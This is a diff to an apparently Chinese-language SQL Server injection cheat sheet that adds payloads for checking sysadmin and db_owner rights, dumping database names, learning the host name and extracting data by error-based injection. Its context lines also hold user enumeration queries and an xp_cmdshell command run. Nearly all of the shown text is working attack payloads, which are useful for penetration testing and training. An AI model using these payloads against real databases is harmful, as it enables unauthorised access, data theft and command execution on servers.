@@ -10,17 +10,19 @@ SQL Server Payload
     - ``SELECT /*comment*/1``
 - Space
     - ``0x01 - 0x20``
-- Current User
+- 用户信息
     - ``SELECT user_name()``
     - ``SELECT system_user``
     - ``SELECT user``
     - ``SELECT loginame FROM master..sysprocesses WHERE spid = @@SPID``
+- 用户权限
+    - ``select IS_SRVROLEMEMBER('sysadmin')``
+    - ``select IS_SRVROLEMEMBER('db_owner')``
 - List User
     - ``SELECT name FROM master..syslogins``
-- Current Database
-    - ``SELECT DB_NAME()``
-- List Database
+- 数据库信息
     - ``SELECT name FROM master..sysdatabases``
+    - ``select quotename(name) from master..sysdatabases FOR XML PATH('')``
 - 执行命令
     - ``EXEC xp_cmdshell 'net user'``
 - Ascii
@@ -37,8 +39,15 @@ SQL Server Payload
     - OpenRowset
 - 当前查询语句
     - ``select text from sys.dm_exec_requests cross apply sys.dm_exec_sql_text(sql_handle)``
+- hostname
+    - 用于判断是否站库分离
+    - ``select host_name()``
 
-错误注入常用函数
+报错注入
+----------------------------------------
+- ``1=convert(int,(db_name()))``
+
+常用函数
 ----------------------------------------
 - SUSER_NAME()
 - USER_NAME()
